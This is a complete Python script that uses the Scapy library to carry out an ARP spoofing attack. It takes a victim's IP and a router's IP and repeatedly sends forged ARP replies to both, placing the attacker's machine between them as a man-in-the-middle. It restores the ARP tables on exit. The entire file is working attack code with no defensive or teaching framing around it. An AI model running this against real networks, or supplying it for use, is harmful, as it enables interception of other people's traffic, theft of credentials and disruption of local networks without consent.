from scapy.all import *
import sys
import time

def arp_spoof(dest_ip, dest_mac, source_ip, iface):
    packet = Ether(dst=dest_mac) / ARP(op="is-at", hwsrc=get_if_hwaddr(iface), psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    sendp(packet, iface=iface, verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac, iface):
    packet = Ether(dst=dest_mac) / ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    sendp(packet, iface=iface, verbose=False)

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <victim_ip> <router_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]
    iface = conf.iface  # Get the default interface
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)

    # Debugging: Print retrieved MAC addresses
    print(f"Victim IP: {victim_ip} - Victim MAC: {victim_mac}")
    print(f"Router IP: {router_ip} - Router MAC: {router_mac}")

    if not victim_mac or not router_mac:
        print("Failed to get MAC address. Exiting...")
        sys.exit(1)

    try:
        print("Sending spoofed ARP packets. Press Ctrl+C to stop.")
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip, iface)
            arp_spoof(router_ip, router_mac, victim_ip, iface)
            time.sleep(2)  # Sleep to avoid flooding the network
    except KeyboardInterrupt:
        print("Restoring ARP tables...")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac, iface)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac, iface)
        print("Exiting...")
        sys.exit(0)

if __name__ == "__main__":
    main()
